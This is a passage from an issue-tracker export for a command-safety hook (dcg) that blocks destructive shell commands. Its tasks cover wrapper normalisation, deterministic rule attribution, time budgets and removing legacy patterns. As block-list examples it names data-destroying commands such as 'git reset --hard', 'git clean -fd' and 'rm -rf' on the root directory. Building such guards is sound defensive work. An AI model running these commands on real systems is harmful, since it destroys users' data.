Strip leading `env` and its option/assignment prefix:\n  - options like `-i`, `-u \u003cname\u003e`, `--ignore-environment`\n  - leading `NAME=VALUE` assignments\n- Stop once we reach a non-assignment token (the real command).\n\n### 3) Leading backslash escapes\n\n- If the *first command token* starts with `\\` (e.g., `\\git`, `\\rm`), strip the leading backslash.\n\n### 4) `command` (careful)\n\n- Only treat `command` as a wrapper when it is used to execute a command, not query:\n  - `command -- git reset --hard` (wrapper)\n  - `command -p git ...` (wrapper)\n  - but NOT: `command -v git` / `command -V git`\n\n## Acceptance criteria\n\n- Wrapper-stripped commands produce identical decisions to the unwrapped form.\n- Explain mode shows both raw and normalized command.\n- No new false positives for `command -v`, `env` without command, etc.\n\n## Tests\n\n- Unit tests for each wrapper form, including edge cases and negative cases.\n- E2E additions in the existing script suite (or integration tests) proving parity:\n  - allow cases remain allowed\n  - deny cases remain denied\n\n## Dependencies\n\n- `git_safety_guard-99e.3.1` (shared evaluator) so normalization is centralized.\n- `git_safety_guard-99e.3` (unify hook pipeline) to remove legacy drift.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T22:18:47.580820469-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:18:47.580820469-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.12","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T22:18:56.873658264-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.12","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T22:19:01.917552626-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.12","depends_on_id":"git_safety_guard-99e.3","type":"blocks","created_at":"2026-01-07T22:19:06.958686949-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.13","title":"Config discovery optimizations (explicit env var, faster repo root detection)","description":"## Objective\n\nReduce overhead and confusion in config loading/discovery by making configuration paths explicit and fast.\n\nThis is primarily about *ergonomics* and *predictability*:\n\n- Users should always be able to answer: \"Which config file is dcg using?\"\n- Deep working directories should not incur slow upward traversal.\n\n## Requirements (v1)\n\n### Explicit config path override\n\n- Support an env var override, e.g. `DCG_CONFIG=/path/to/config.toml`.\n- If set:\n  - use it\n  - validate existence and parse errors clearly\n  - surface in `dcg config` and `dcg doctor`\n\n### Fast repo-root detection (for repo-scoped features)\n\nSome features need repo root (safe cleanup pack, project allowlists, scan defaults).\n\n- Implement a bounded upward search for `.git`:\n  - stop at filesystem root\n  - cap maximum parent traversals (e.g., 50)\n  - avoid `canonicalize()` on every hop unless needed\n\n### Determinism\n\n- When multiple config sources exist, precedence order is explicit and documented.\n\n## Acceptance criteria\n\n- `dcg doctor` reports the exact config path in use.\n- No observable latency regression on common commands in deep trees.\n\n## Tests\n\n- Unit tests for config precedence:\n  - env var override beats default\n  - missing override path yields clear error (hook fail-open; CLI fail)\n- Unit tests for repo-root detection:\n  - finds `.git` correctly\n  - respects traversal cap\n\n## Dependencies\n\n- `git_safety_guard-1gt.7` doctor improvements (to surface which config is in use).\n","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T22:19:26.993779878-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:19:26.993779878-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.13","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T22:19:35.558798516-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.13","depends_on_id":"git_safety_guard-1gt.7","type":"blocks","created_at":"2026-01-07T22:19:40.602785331-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.14","title":"Hardening: evaluation time budget + fail-open on overrun (hook safety)","description":"## Objective\n\nGuarantee that the hook path stays responsive by enforcing a conservative evaluation time budget and **fail-open** behavior when budgets are exceeded.\n\n## Background\n\n`dcg` is invoked for every Bash command. A rare 200ms spike is worse than many tools' average runtime.\n\nWe cannot preempt every operation (e.g., a single regex call), but we *can*:\n\n- design algorithms to avoid known worst-cases (see regex audit)\n- cap expensive tiers (heredoc extraction/AST parsing)\n- enforce stage-level deadlines and bail out early when possible\n\n## Proposed design (v1)\n\n- Introduce a `Deadline` helper (wraps `Instant` + max duration).\n- The shared evaluator receives an optional deadline:\n  - hook path sets a tight budget (e.g., 10ms)\n  - CLI tools may set a larger budget or none\n\n### Budget application\n\n- Always check deadline between stages:\n  - after JSON parse\n  - after normalization\n  - after execution-context classification\n  - before/after each expensive tier (heredoc extraction, AST matching)\n\n- For expensive tiers:\n  - if remaining time is low, skip deep analysis and fail-open (ALLOW/WARN) with a trace/log marker\n\n### External processes (if used)\n\n- Any spawned process (ast-grep) must have a hard timeout:\n  - kill child\n  - treat as \"analysis skipped\" (fail-open)\n\n## Output / observability\n\n- If a deadline is exceeded:\n  - hook mode: ALLOW (fail-open) + structured log (if enabled)\n  - explain mode: show `skipped_due_to_budget: true`\n\n## Acceptance criteria\n\n- Hook evaluation never exceeds the configured budget by more than a small overhead margin.\n- Budget overruns are detectable via logs and explain traces.\n- No panics or hangs when budgets are exceeded.\n\n## Tests\n\n- Deterministic test that forces the budget to be tiny (e.g., 0us) and asserts:\n  - evaluation returns ALLOW in hook mode\n  - explain includes the budget-skip marker\n\n## Dependencies\n\n- `git_safety_guard-99e.3.1` shared evaluator\n- `git_safety_guard-99e.11` regex safety audit (mitigate un-preemptable regex worst cases)\n- `git_safety_guard-1gt.1.1` trace model (to surface budget skips cleanly)\n","notes":"Partial progress: Tier 2 heredoc extraction now enforces ExtractionLimits.timeout_ms (fail-open) and records SkipReason::Timeout. Also fixes misleading UnterminatedHeredoc attribution when max_body_lines/max_body_bytes stops body scanning (now reports ExceededLineLimit/ExceededSizeLimit as appropriate). Added unit tests for timeout + line-limit skip reasons.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T22:20:02.564887486-05:00","created_by":"ubuntu","updated_at":"2026-01-08T03:55:27.971316841-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.14","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T22:20:13.584359237-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.14","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T22:20:18.627347442-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.14","depends_on_id":"git_safety_guard-99e.11","type":"blocks","created_at":"2026-01-07T22:20:23.673397563-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.14","depends_on_id":"git_safety_guard-1gt.1.1","type":"blocks","created_at":"2026-01-07T22:20:28.803796-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.2","title":"Deterministic pack evaluation + return pattern identity","description":"## Objective\n\nMake allow/deny decisions **deterministic and debuggable** by:\n\n1. Evaluating enabled packs in a stable order.\n2. Returning a stable identifier for the matched rule (pack_id + pattern_name).\n\n## Background\n\n`PackRegistry::check_command` currently iterates enabled packs using a `HashSet` (`src/packs/mod.rs`). HashSet iteration order is not stable, so if multiple packs could block a command the chosen reason/attribution can vary run-to-run.\n\nEven when only one pack blocks, future features (explainability, allowlisting by ID, analytics) require stable pattern identity.\n\n## Proposed changes\n\n### 1) Stable pack ordering\n\n- Expand enabled categories into concrete pack IDs.\n- Sort pack IDs deterministically (e.g., lexicographic) OR define an explicit priority ordering.\n\nRecommended: **explicit ordering tiers**, then lexicographic within tier:\n\n1. `core.*` packs\n2. safety-critical infra packs (disk, permissions)\n3. kubernetes/containers/cloud/infrastructure\n4. database packs\n5. `strict_git` (or decide if strict should be earlier; justify)\n6. package managers\n\nRationale: prefer the most human-relevant reason (e.g., “rm -rf on / is extremely dangerous” over generic rm).\n\n### 2) Include `pattern_name` in results\n\n- Extend `Pack::matches_destructive` to return the matched `DestructivePattern` (not just the reason string).\n- Extend `CheckResult` to include:\n  - `pack_id`\n  - `pattern_name` (optional for unnamed patterns)\n  - `reason`\n\n### 3) Keep performance sane\n\n- Deterministic ordering can be precomputed per invocation after config load.\n- Avoid allocations in hot paths; keep `reason` static strings where possible.\n\n## Acceptance criteria\n\n- Running the same blocked input 100 times yields identical `pack_id` + `pattern_name`.\n- If multiple packs match, the chosen attribution is stable and documented.\n- Hook deny output and `dcg test` (once unified) can display `pack_id` and `pattern_name`.\n\n## Follow-ups unlocked\n\n- Allowlisting by `(pack_id, pattern_name)` without forcing users to write regex.\n- `dcg test --explain` can show the exact rule that matched.\n","notes":"## Review Additions (2026-01-08)\n\n### Why this reduces false positives\nDeterministic attribution + stable rule IDs are a prerequisite for low-friction false-positive resolution:\n\n- `dcg explain` can reliably print `pack_id:pattern_name`.\n- Users can allowlist *the exact* rule that caused a nuisance block without copying regex.\n- E2E/CI results stop “flapping” between different attributions.\n\n### Tests to include\n- Determinism test: run the same input N times and assert the same `(pack_id, pattern_name)`.\n- Allowlist stability test (once allowlisting exists): allowlisting by rule ID continues to work across rebuilds.","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T19:59:48.537370468-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:51:36.405851444-05:00","closed_at":"2026-01-07T23:51:36.405851444-05:00","close_reason":"All P1 children complete: stable pack iteration, pattern metadata propagation, and determinism tests. Only P2 child (matched span) remains.","dependencies":[{"issue_id":"git_safety_guard-99e.2","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T19:59:48.547707155-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.2.1","title":"Implement stable pack iteration order","description":"## Objective\n\nEnsure `PackRegistry::check_command` evaluates packs in a deterministic order.\n\n## Implementation notes\n\n- Replace iteration over `HashSet` with a `Vec` of pack IDs.\n- After expanding categories, produce a stable ordered list:\n  - explicit tiering (see parent) OR simple `sort_unstable()` with documented semantics.\n\n## Acceptance criteria\n\n- If multiple packs would block the same command, the same pack is always selected.\n- Ordering is unit-tested.\n","notes":"## Review Additions (2026-01-08)\n\n### Tests\n- Unit test: registry pack iteration order is stable and matches a documented ordering (e.g., sorted by pack_id or by tier then pack_id).\n- Regression test: if multiple packs match a single command, the chosen attribution is stable.","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:06.097069365-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:48:45.632230103-05:00","closed_at":"2026-01-07T23:48:45.632230103-05:00","close_reason":"Implemented: expand_enabled_ordered with tier-based ordering (core→system→infra→cloud→k8s→containers→database→pkg_mgrs→strict_git). Added 7 tests for determinism.","dependencies":[{"issue_id":"git_safety_guard-99e.2.1","depends_on_id":"git_safety_guard-99e.2","type":"parent-child","created_at":"2026-01-07T20:00:06.098252353-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.2.2","title":"Propagate matched pattern metadata (pack_id + pattern_name)","description":"## Objective\n\nReturn the matched pattern identity end-to-end.\n\n## Implementation notes\n\n- Change `Pack::matches_destructive` to return the matched `DestructivePattern` (or its `{reason, name}`) instead of only `reason`.\n- Update `Pack::check` and `PackRegistry::check_command` to include `pattern_name` in the result.\n- Decide representation:\n  - `Option\u003c\u0026'static str\u003e` internally\n  - `Option\u003cString\u003e` in `CheckResult` for output (or keep static via Cow)\n\n## Acceptance criteria\n\n- A block result includes:\n  - `pack_id`\n  - `pattern_name` (when defined)\n  - `reason`\n","notes":"## Review Additions (2026-01-08)\n\n### Why this matters for false positives\nWithout propagating `pack_id` + `pattern_name` through the evaluator output:\n\n- `dcg explain` can’t precisely say what matched.\n- allowlisting can’t target a specific rule, forcing users into broad workarounds.\n\nThat turns rare false positives into repeated velocity killers.\n\n### Tests\n- Ensure the evaluator result always contains stable metadata on deny/warn decisions.\n- Ensure metadata remains deterministic and is not affected by `HashSet`/map iteration ordering.","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:11.130270969-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:51:31.273942709-05:00","closed_at":"2026-01-07T23:51:31.273942709-05:00","close_reason":"Implemented pattern_name propagation: Added DestructiveMatch struct with reason and name fields. Updated CheckResult to include pattern_name field. Updated Pack::matches_destructive and Pack::check to return full match metadata. Added tests for pattern_name propagation.","dependencies":[{"issue_id":"git_safety_guard-99e.2.2","depends_on_id":"git_safety_guard-99e.2","type":"parent-child","created_at":"2026-01-07T20:00:11.131660786-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.2.3","title":"Add deterministic attribution + pattern identity tests","description":"## Objective\n\nAdd tests that enforce determinism and pattern identity.\n\n## Test plan\n\n- Construct an input that matches multiple packs (or multiple patterns) and assert the chosen `pack_id/pattern_name` is stable.\n- Add a snapshot-style test for `dcg test` output once CLI/hook are unified.\n\n## Acceptance criteria\n\n- Tests fail if iteration order becomes nondeterministic.\n","notes":"## Review Additions (2026-01-08)\n\n### Why this matters for false positives\nThese tests are what prevent “it blocked, but I can’t tell *which rule* reliably” regressions.\nThat kind of instability makes allowlisting untrustworthy and increases operator pain.\n\n### Test matrix to include\n- Multiple packs enabled where more than one could match.\n- Verify first-match attribution is stable and includes:\n  - `pack_id`\n  - `pattern_name`\n  - matched span/preview where applicable","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:16.16252083-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:51:16.372680046-05:00","closed_at":"2026-01-07T23:51:16.372680046-05:00","close_reason":"Tests complete: check_command_attribution_is_deterministic now checks pack_id AND pattern_name stability, plus 3 other pattern identity tests","dependencies":[{"issue_id":"git_safety_guard-99e.2.3","depends_on_id":"git_safety_guard-99e.2","type":"parent-child","created_at":"2026-01-07T20:00:16.163714999-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.2.3","depends_on_id":"git_safety_guard-99e.2.1","type":"blocks","created_at":"2026-01-07T20:13:24.386751714-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.2.3","depends_on_id":"git_safety_guard-99e.2.2","type":"blocks","created_at":"2026-01-07T20:13:29.421657486-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.2.4","title":"Capture matched span + matched text preview for first match (enables explain highlighting)","description":"## Objective\n\nWhen a rule matches, capture *where* it matched and a small preview of the matched text so `dcg explain` can highlight it.\n\nToday the matcher mostly answers only \"did it match?\" and \"what reason?\". For explainability we also need:\n\n- matched byte range within the evaluated string\n- a short text preview suitable for UI (truncated, UTF-8 safe)\n\n## Requirements\n\n### Match data model\n\n- Extend the internal match result for a blocking decision to include:\n  - `matched_span: { start, end }` (byte offsets)\n  - `matched_text_preview` (bounded length, e.g., 80 chars)\n\n### Matching implementation\n\n- Use regex APIs that can return match locations:\n  - avoid `is_match` on the critical path when we need match location\n  - prefer `find` / `captures` and record the first match\n\n- Determinism:\n  - match selection must be deterministic:\n    - packs are already made deterministic via `git_safety_guard-99e.2.1`\n    - within a pack, patterns are evaluated in declaration order\n    - within a pattern, take the first match span\n\n### Redaction/truncation\n\n- Match previews must:\n  - be UTF-8 safe\n  - be deterministically truncated\n  - support redaction rules (reuse `--redact` logic used by explain/scan/logging)\n\n## Acceptance criteria\n\n- Block decisions include rule id + matched span.\n- Explain pretty output can highlight the match accurately.\n- Repeated runs produce identical spans and previews.\n\n## Tests\n\n- Unit tests for:\n  - span correctness on representative patterns\n  - truncation correctness on long/unicode inputs\n  - determinism: same input run N times yields same matched span\n\n## Dependencies\n\n- `git_safety_guard-99e.2.1` stable pack ordering (deterministic first match)\n- `git_safety_guard-99e.2.2` pattern identity propagation\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T22:37:27.564165231-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:37:27.564165231-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.2.4","depends_on_id":"git_safety_guard-99e.2","type":"parent-child","created_at":"2026-01-07T22:37:39.430419555-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.2.4","depends_on_id":"git_safety_guard-99e.2.1","type":"blocks","created_at":"2026-01-07T22:37:44.471948552-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.2.4","depends_on_id":"git_safety_guard-99e.2.2","type":"blocks","created_at":"2026-01-07T22:37:49.517982473-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.3","title":"Unify hook pipeline (single parser/output); retire legacy matcher","description":"## Objective\n\nReduce duplication and inconsistency by making hook-mode and CLI-mode use a single, shared pipeline:\n\n- One hook input parser\n- One normalization step\n- One decision engine (packs + overrides + context layers)\n- One denial output formatter\n\nThen retire the legacy SAFE/DESTRUCTIVE pattern logic currently duplicated in `src/main.rs`.\n\n## Background\n\nToday the repo has:\n\n- Hook parsing duplicated in `src/main.rs` and in `src/hook.rs`.\n- Deny output duplicated (`deny()` and `hook::output_denial`).\n- Legacy patterns in `src/main.rs` that overlap with `core.git` and `core.filesystem` packs.\n\nThis increases maintenance burden and risks divergence:\n\n- The same command may be treated differently depending on which path is used.\n- Fixes may be applied to packs but not legacy, or vice versa.\n\n## Proposed approach\n\n1. Expose a single internal function like `evaluate_command(config, raw_command) -\u003e Decision`.\n2. Hook mode:\n   - parse input via `hook::read_hook_input` / `hook::extract_command`\n   - call evaluator\n   - on deny: use `hook::output_denial`\n3. CLI `dcg test`:\n   - normalize and call evaluator\n   - print human output\n\n4. Retire legacy patterns:\n   - Ensure `core.git` + `core.filesystem` packs fully cover the legacy patterns.\n   - Remove the legacy SAFE_PATTERNS/DESTRUCTIVE_PATTERNS code path.\n\n## Acceptance criteria\n\n- Hook mode and `dcg test` agree on allow/deny for all existing E2E cases.\n- Unit tests cover the shared evaluator (no hidden behavior in `main`).\n- No duplicate deny formatting code remains.\n","notes":"## Review Additions (2026-01-08)\n\n### Determinism / parity\nUnifying the hook + CLI evaluator path is also a determinism safeguard:\n\n- it removes “two subtly different pipelines” drift\n- it makes parity tests meaningful (same codepath)\n- it keeps output attribution consistent for allowlisting/explain\n\n### Tests\n- `git_safety_guard-99e.3.5` should cover table-driven parity cases.\n- Add at least one non-core-pack regression case once pack reachability is fixed.","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:33.342948016-05:00","created_by":"ubuntu","updated_at":"2026-01-08T03:01:01.166262062-05:00","closed_at":"2026-01-08T03:01:01.166262062-05:00","close_reason":"All 5 subtasks completed: shared evaluator API, hook refactor, CLI refactor, parity tests, and legacy pattern removal","dependencies":[{"issue_id":"git_safety_guard-99e.3","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:00:33.3440917-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.3.1","title":"Create shared evaluator API (hook + CLI)","description":"## Objective\n\nImplement a single internal evaluation entry point used by both hook mode and CLI.\n\n## Requirements\n\n- Inputs:\n  - raw command string\n  - loaded config\n  - enabled packs (expanded)\n- Outputs:\n  - Allow / Deny\n  - Deny includes `pack_id`, `pattern_name`, `reason`\n\n## Acceptance criteria\n\n- Hook and CLI can both call the evaluator without re-implementing parsing.\n","notes":"## Review Additions (2026-01-08)\n\n### Tests\n- Unit test: the shared evaluator can be invoked from both:\n  - hook JSON entrypoint\n  - CLI entrypoint\n  and returns the same structured result type.\n- Regression test: ensure shared evaluator is the *only* codepath used (no legacy matcher reachable).","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:52.440864652-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:44:18.74359081-05:00","closed_at":"2026-01-07T23:44:18.74359081-05:00","close_reason":"Implemented shared evaluator API in src/evaluator.rs with EvaluationResult, EvaluationDecision, PatternMatch types and evaluate_command/evaluate_command_with_legacy functions. All 92 tests pass.","dependencies":[{"issue_id":"git_safety_guard-99e.3.1","depends_on_id":"git_safety_guard-99e.3","type":"parent-child","created_at":"2026-01-07T20:00:52.442017573-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.3.2","title":"Refactor hook-mode main() to use src/hook.rs","description":"## Objective\n\nMake hook mode use `hook::read_hook_input`, `hook::extract_command`, and `hook::output_denial`.\n\n## Acceptance criteria\n\n- `src/main.rs` no longer defines its own HookInput/HookOutput structs.\n- Denials always go through `hook::output_denial`.\n","notes":"## Review Additions (2026-01-08)\n\n### Tests\n- Refactor should be covered by the parity tests (`git_safety_guard-99e.3.5`).\n- Add a smoke integration test that runs the binary with a minimal hook JSON input and asserts:\n  - allow → no stdout\n  - deny → valid JSON denial","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:57.473147495-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:23:48.252262533-05:00","closed_at":"2026-01-08T00:23:48.252262533-05:00","close_reason":"COMPLETED: src/main.rs no longer defines HookInput/HookOutput structs. All denials go through hook::output_denial(). Removed duplicate format_denial_message, print_colorful_warning, and deny() functions. All 136 tests pass, clippy clean.","dependencies":[{"issue_id":"git_safety_guard-99e.3.2","depends_on_id":"git_safety_guard-99e.3","type":"parent-child","created_at":"2026-01-07T20:00:57.474491536-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.2","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:12:54.191454699-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.3.3","title":"Refactor CLI dcg test to share evaluator semantics","description":"## Objective\n\nEnsure `dcg test` uses the same normalization, override evaluation, context layers, and pack evaluation ordering as hook mode.\n\n## Acceptance criteria\n\n- `dcg test` and hook-mode JSON input agree on allow/deny + attribution for the same command.\n","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T20:01:02.50501207-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:26:41.814089651-05:00","closed_at":"2026-01-08T00:26:41.814089651-05:00","close_reason":"Refactored CLI dcg test to use shared evaluator from src/evaluator.rs. Now has parity with hook mode: config overrides, quick rejection, command normalization, and rich output (pack ID, pattern name, reason, source).","dependencies":[{"issue_id":"git_safety_guard-99e.3.3","depends_on_id":"git_safety_guard-99e.3","type":"parent-child","created_at":"2026-01-07T20:01:02.506104728-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.3","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:12:59.224813761-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.3.4","title":"Remove legacy SAFE_PATTERNS/DESTRUCTIVE_PATTERNS from src/main.rs","description":"## Objective\n\nEliminate the legacy hardcoded pattern lists in `src/main.rs` once parity with packs is verified.\n\n## Why\n\nDuplication increases risk of divergence and makes it harder to reason about false positives. The legacy `SAFE_PATTERNS` and `DESTRUCTIVE_PATTERNS` in `src/main.rs` overlap with `core.git` and `core.filesystem` packs.\n\n## Pre-Removal Verification (CRITICAL)\n\nBefore removing ANY legacy code, we MUST verify parity:\n\n### Step 1: Create Parity Test Corpus\n\n```bash\n# Create test corpus from legacy patterns\nmkdir -p tests/corpus/legacy_parity\n```\n\nFor each legacy pattern:\n1. Extract example commands that match the pattern\n2. Record expected allow/deny decision\n3. Save to `tests/corpus/legacy_parity/`\n\n### Step 2: Run Comparison\n\n```rust\n#[test]\nfn test_legacy_pack_parity() {\n    let corpus = load_parity_corpus();\n\n    for case in corpus {\n        // Run through legacy matcher\n        let legacy_result = legacy_check(\u0026case.command);\n\n        // Run through pack-based matcher\n        let pack_result = pack_check(\u0026case.command);\n\n        assert_eq!(\n            legacy_result.decision,\n            pack_result.decision,\n            \"Parity mismatch for: {}\",\n            case.command\n        );\n    }\n}\n```\n\n### Step 3: Document Intentional Differences\n\nIf packs intentionally differ from legacy (e.g., fixing a false positive):\n- Document the difference in a comment\n- Add a test case proving the new behavior is correct\n- Get explicit sign-off before proceeding\n\n## Removal Process\n\n1. **Audit Phase**\n   - List all legacy SAFE_PATTERNS with line numbers\n   - List all legacy DESTRUCTIVE_PATTERNS with line numbers\n   - Map each to corresponding pack pattern\n\n2. **Parity Phase**\n   - Run parity tests (must pass 100%)\n   - Document any intentional differences\n\n3. **Removal Phase**\n   - Remove legacy pattern definitions\n   - Remove legacy matching code paths\n   - Update tests that referenced legacy patterns\n\n4. **Verification Phase**\n   - All existing unit tests pass\n   - All E2E tests pass\n   - Run full regression corpus\n\n## Legacy Patterns to Remove\n\n### SAFE_PATTERNS (src/main.rs)\n- `git status`, `git diff`, `git log`, etc.\n- These should be covered by `core.git` safe patterns\n\n### DESTRUCTIVE_PATTERNS (src/main.rs)\n- `git reset --hard`, `git clean -fd`, etc.\n- These should be covered by `core.git` destructive patterns\n\n## Risk Mitigation\n\n- Create a feature flag: `--legacy-patterns` to temporarily re-enable\n- Keep legacy code commented (not deleted) for 2 weeks\n- Monitor for regression reports\n\n## Acceptance Criteria\n\n- All existing unit + E2E tests still pass.\n- `core.git` and `core.filesystem` packs fully cover the legacy behavior.\n- Parity test corpus is checked into the repo.\n- No decision changes for any existing test case (unless intentional and documented).","status":"closed","priority":2,"issue_type":"task","assignee":"RoseRiver","created_at":"2026-01-07T20:01:07.537906195-05:00","created_by":"ubuntu","updated_at":"2026-01-08T01:51:09.114912178-05:00","closed_at":"2026-01-08T01:51:09.114912178-05:00","close_reason":"Removed local normalize_command function and PATH_NORMALIZER from main.rs. Now using packs::normalize_command. All 231 tests pass.","dependencies":[{"issue_id":"git_safety_guard-99e.3.4","depends_on_id":"git_safety_guard-99e.3","type":"parent-child","created_at":"2026-01-07T20:01:07.539030542-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.4","depends_on_id":"git_safety_guard-99e.3.2","type":"blocks","created_at":"2026-01-07T20:13:04.258280353-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.4","depends_on_id":"git_safety_guard-99e.3.3","type":"blocks","created_at":"2026-01-07T20:13:09.290073454-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.3.5","title":"Add hook/CLI evaluator parity tests","description":"## Objective\n\nAdd tests that assert the shared evaluator produces identical decisions regardless of entrypoint.\n\n## Acceptance criteria\n\n- A table-driven test feeds commands to:\n  - hook JSON path\n  - CLI test path\n  and asserts identical results.\n","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T20:01:12.571055269-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:31:46.614009476-05:00","closed_at":"2026-01-08T00:31:46.614009476-05:00","close_reason":"Added 6 parity tests to src/evaluator.rs: parity_allowed_commands, parity_pack_blocked_commands, parity_config_allow_override, parity_config_block_override, legacy_patterns_cause_expected_divergence, parity_command_normalization. Tests verify evaluate_command and evaluate_command_with_legacy produce identical decisions for pack-based patterns.","dependencies":[{"issue_id":"git_safety_guard-99e.3.5","depends_on_id":"git_safety_guard-99e.3","type":"parent-child","created_at":"2026-01-07T20:01:12.572353334-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.5","depends_on_id":"git_safety_guard-99e.3.2","type":"blocks","created_at":"2026-01-07T20:13:14.322063967-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.5","depends_on_id":"git_safety_guard-99e.3.3","type":"blocks","created_at":"2026-01-07T20:13:19.353820038-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.4","title":"Precompile config override regexes (no per-command compilation)","description":"## Objective\n\nEliminate per-invocation regex compilation for config overrides.\n\n## Background\n\nHook mode currently compiles override regexes on every command:\n\n- allow overrides: `Regex::new(allow.pattern())` in the hot path\n- block overrides: `Regex::new(\u0026block.pattern)` in the hot path\n\nThis is:\n\n- slow (regex compilation is expensive relative to typical command length)\n- unpredictable (worst-case time spikes)\n- potentially abusable (a malicious or accidental heavy regex)\n\n## Proposed approach\n\n- At config load time, compile all override patterns once.\n- Store them in a runtime representation (e.g., `CompiledOverrides`) separate from the serde config struct.\n- Invalid override regexes should be handled explicitly:\n  - either: treat as configuration error and disable the override with a warning\n  - or: fail closed on startup (probably not desired for a hook)\n\nRecommendation: **fail open but log** for invalid regex, so the hook keeps working.\n\n## Acceptance criteria\n\n- No `Regex::new(...)` calls exist on the per-command hot path for overrides.\n- Unit tests cover:\n  - valid allow override match\n  - valid block override match\n  - invalid regex handling path\n- Performance: repeated allow decisions do not allocate.\n","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T20:01:26.682700605-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:39:52.124132956-05:00","closed_at":"2026-01-08T00:39:52.124132956-05:00","close_reason":"Integrated CompiledOverrides into evaluator hot path. evaluate_command and evaluate_command_with_legacy now accept precompiled overrides, eliminating per-command Regex::new() calls. All 92 tests pass.","dependencies":[{"issue_id":"git_safety_guard-99e.4","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:01:26.683820875-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.4.1","title":"Implement CompiledOverrides (compile allow/block once)","description":"## Objective\n\nIntroduce a runtime-only representation of overrides that holds **compiled** regexes so overrides never compile per-command in the hook hot path.\n\n## Background / Why\n\nThe hook runs for every Bash command. Any per-command regex compilation (even rarely) creates latency spikes and undermines confidence in performance budgets.\n\nWe already parse config as serde structs; this task adds a post-load compilation step that turns \"user text\" into precompiled matcher objects.\n\n## Design\n\n### Keep serde parsing unchanged\n\n- Keep existing `Config` (or equivalent) as the serde/`toml` representation.\n- Add a post-load step that compiles overrides exactly once:\n  - `Config::compile()` → `CompiledConfig` (or `Config` + cached compiled fields).\n\n### CompiledOverrides\n\nCreate a runtime-only struct that holds compiled matchers:\n\n- allow-overrides: list of regexes (or structured rules) that force-allow\n- deny-overrides: list of regexes that force-deny\n\nEvaluation order must be explicit and deterministic:\n\n1. allow overrides (short-circuit allow)\n2. deny overrides (short-circuit deny)\n3. normal pack evaluation\n\n### Invalid regex behavior (must be safe)\n\n- Invalid regex must **not crash** the hook.\n- 